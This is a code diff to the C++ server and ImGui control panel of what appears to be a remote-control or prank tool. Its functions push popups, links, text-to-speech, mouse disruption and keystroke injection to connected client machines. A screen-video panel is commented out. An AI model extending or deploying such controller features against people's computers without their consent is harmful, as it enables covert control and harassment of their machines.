@@ -89,16 +89,29 @@ public:
         return nullptr;
     }
 
-    void handle_client_connect() {
-        while(true) {
+    void handle_client_connect()
+    {
+        while (true)
+        {
             auto socket = std::make_unique<tcp::socket>(io_context_);
             asio::error_code ec;
-            ec = acceptor_.accept(*socket, ec);
-            if (ec) continue;
-            
+            acceptor_.accept(*socket, ec);
+            if (ec) {
+                std::cerr << "accept failed: " << ec.message() << '\n';
+                continue;
+            }
+    
+            asio::ip::tcp::endpoint ep = socket->remote_endpoint(ec);
+            if (!ec) {
+                std::string ip   = ep.address().to_string();
+                unsigned short port = ep.port();
+                std::cout << "New client from " << ip << ':' << port << '\n';
+            } else {
+                std::cerr << "remote_endpoint error: " << ec.message() << '\n';
+            }
+    
             std::unique_lock<std::mutex> lock(client_mutex_);
-            auto client = std::make_unique<Client>(std::move(*socket));
-            clients_[current_id_++] = std::move(client);
+            clients_[current_id_++] = std::make_unique<Client>(std::move(*socket));
         }
     }
 
@@ -299,14 +312,17 @@ int main() {
     });
     accept_thread.detach();
 
-    // std::thread alive_thread([&server]() {
-    //     server.check_if_client_alive();
-    // });
-    // alive_thread.detach();
+    std::thread alive_thread([&server]() {
+        server.check_if_client_alive();
+    });
+    alive_thread.detach();
 
     Send_Field popup{"Popup", packet_id::POPUP, server};
     Send_Field open{"Open", packet_id::OPEN_LINK, server};
     Send_Field tts{"Send tts", packet_id::TTS, server};
+
+    Send_Field send_keyboard{"Type what", packet_id::SEND_KEYBOARD, server};
+    Toggle_Field echo_keyboard{"Echo keyboard", packet_id::ECHO_KEYBOARD, server};
 
     Toggle_Field move_mouse{"Random move mouse",packet_id::RANDOM_MOUSE_MOVE,server};
     Toggle_Field invert_mouse{"Invert mouse", packet_id::INVERT_MOUSE,server};
@@ -314,27 +330,20 @@ int main() {
     int size_x = 100,size_y = 100;
     
     GLuint texture_id = create_texture();
-    int delay = 0;
     while (!glfwWindowShouldClose(window)) {
         glfwPollEvents();
         ImGui_ImplOpenGL3_NewFrame();
         ImGui_ImplGlfw_NewFrame();
         
-        delay++;
-        if(delay == 500) {
-            server.check_if_client_alive();
-            delay = 0;
-        }
         
         ImGui::NewFrame();
-             ImGui::Begin("Video");
-                int height, width;
-                std::vector<unsigned char> png = server.get_video_frame(width,height);
-                modify_texture(texture_id, png.data(), width, height);
-                ImVec2 video_space = ImGui::GetContentRegionAvail();
-                //ImGui::Image((ImTextureID)(intptr_t)texture_id, ImVec2((float)width, (float)height));
-                ImGui::Image((ImTextureID)(intptr_t)texture_id, video_space);
-             ImGui::End();
+             // ImGui::Begin("Video");
+             //    int height, width;
+             //    std::vector<unsigned char> png = server.get_video_frame(width,height);
+             //    modify_texture(texture_id, png.data(), width, height);
+             //    ImVec2 video_space = ImGui::GetContentRegionAvail();
+             //    ImGui::Image((ImTextureID)(intptr_t)texture_id, video_space);
+             // ImGui::End();
 
         ImGui::Begin("Send Data");
         /*
@@ -408,10 +417,13 @@ int main() {
 
         ImGui::Begin("Keyboard");
         /*
-            - send message to be typed by the user's keyboard
+            d send message to be typed by the user's keyboard
             - echo keyboard (repeats what was typed after a few seconds)
             - make it so keyboard presses become a random key (t)
         */
+        send_keyboard.draw();
+        echo_keyboard.draw();
+
         ImGui::End();
 
         ImGui::Begin("Visual & Sound");
